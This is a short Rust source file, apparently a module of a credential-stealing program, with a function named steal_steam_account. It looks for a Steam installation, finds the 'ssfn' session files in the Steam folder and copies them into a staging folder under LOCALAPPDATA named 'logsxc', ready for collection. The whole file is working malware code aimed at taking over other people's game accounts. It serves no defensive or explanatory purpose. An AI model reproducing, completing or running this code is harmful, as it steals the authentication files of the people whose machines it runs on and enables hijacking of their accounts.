use walkdir::*;

fn is_ssfn(entry: &DirEntry) -> bool {
    entry.file_name()
         .to_str()
         .map(|s| s.starts_with("ssfn"))
         .unwrap_or(false)
}


pub fn steal_steam_account() -> Option<String> {


    if std::path::Path::new("C:\\Program Files (x86)\\Steam\\").exists() {
        std::fs::create_dir(format!("{}\\logsxc\\steam\\", &std::env::var("LOCALAPPDATA").unwrap())).unwrap();


      for entry in WalkDir::new("C:\\Program Files (x86)\\Steam\\").max_depth(1).into_iter().filter_map(|f| f.ok()) {
           

            if !is_ssfn(&entry) {
                continue;
            }

            
            std::fs::copy(entry.path(), &format!("{}\\logsxc\\steam\\{}", &std::env::var("LOCALAPPDATA").unwrap(), entry.file_name().to_str().unwrap())).ok()?; // Copy Steam shit
        }


    }
    Some("Steam".to_string())

}
